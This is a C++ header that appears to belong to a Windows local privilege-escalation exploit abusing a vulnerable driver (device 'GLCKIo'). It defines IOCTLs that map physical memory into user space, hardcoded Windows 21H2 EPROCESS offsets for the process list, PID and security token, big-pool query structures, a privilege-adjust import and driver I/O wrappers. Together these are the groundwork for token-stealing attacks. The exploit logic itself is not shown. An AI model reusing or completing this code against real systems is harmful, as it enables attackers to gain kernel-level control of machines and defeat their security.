#pragma once
#include <Windows.h>
#include <stdio.h>

// IOCTL Definitions
#define IOCTL_WINIO_MAPPHYSTOLIN 0x80102040
#define IOCTL_WINIO_UNMAPPHYSADDR 0x80102044


// hardcoded offsets 21H2
constexpr ULONG EPROCESS_ActiveProcessLinks_OFFSET = 0x448;
constexpr ULONG EPROCESS_PID_OFFSET = 0x440;
constexpr ULONG EPROCESS_TOKEN_OFFSET = 0x4B8;


// Device path
#define DEVICE_PATH L"\\\\.\\GLCKIo"

typedef struct {
    HANDLE hDevice;
} DeviceIO;


#define SystemBigPoolInformation 0x42

typedef NTSTATUS(WINAPI* pNtQuerySystemInformation)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
    );

// Einmalig resolven
auto NtQuerySystemInformation2 = (pNtQuerySystemInformation)GetProcAddress(
    GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation"
);


//the first 8 bytes of the structure specify the size of the physical memory to be mapped,
// so we can use GlobalMemoryStatusEx to retrieve the highest physical address and specify
// that we want to map the physical memory up to this last existing physical address. 
typedef struct {
    ULONG64 size;
    ULONG64 val1;
    ULONG64 val2;
    ULONG64 mappingAddress;
    ULONG64 val3;
} MapingInputStruct;

typedef struct _SYSTEM_BIGPOOL_ENTRY
{
    union
    {
        PVOID VirtualAddress;
        ULONG_PTR NonPaged : 1;
    };
    SIZE_T SizeInBytes;
    union
    {
        UCHAR Tag[4];
        ULONG TagUlong;
    };
} SYSTEM_BIGPOOL_ENTRY, * PSYSTEM_BIGPOOL_ENTRY;


typedef struct _SYSTEM_BIGPOOL_INFORMATION
{
    ULONG Count;
    _Field_size_(Count) SYSTEM_BIGPOOL_ENTRY AllocatedInfo[1];
} SYSTEM_BIGPOOL_INFORMATION, * PSYSTEM_BIGPOOL_INFORMATION;


typedef NTSTATUS(NTAPI* pNtQuerySystemInformation)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

typedef NTSTATUS(NTAPI* pRtlAdjustPrivilege)(
    ULONG Privilege,
    BOOLEAN Enable,
    BOOLEAN Client,
    PBOOLEAN WasEnabled
);


inline pRtlAdjustPrivilege RtlAdjustPrivilege =
    (pRtlAdjustPrivilege)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlAdjustPrivilege");

static inline BOOL DeviceIO_Open(DeviceIO* io, LPCWSTR devicePath) {
    io->hDevice = CreateFileW(
        devicePath,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    return io->hDevice != INVALID_HANDLE_VALUE;
}

static inline void DeviceIO_Close(DeviceIO* io) {
    if (io->hDevice && io->hDevice != INVALID_HANDLE_VALUE) {
        CloseHandle(io->hDevice);
        io->hDevice = INVALID_HANDLE_VALUE;
    }
}

static inline BOOL DeviceIO_Read(DeviceIO* io, LPVOID output, DWORD outputSize, DWORD* bytesRead) {
    return ReadFile(io->hDevice, output, outputSize, bytesRead, NULL);
}

static inline BOOL DeviceIO_SendReceive(
    DeviceIO* io, DWORD ioctl,
    LPVOID input, DWORD inputSize,
    LPVOID output, DWORD outputSize,
    DWORD* bytesReturned
) {
    DWORD returned = 0;
    BOOL success = DeviceIoControl(
        io->hDevice, ioctl,
        input, inputSize,
        output, outputSize,
        &returned, NULL
    );
    if (bytesReturned)
        *bytesReturned = returned;
    return success;
}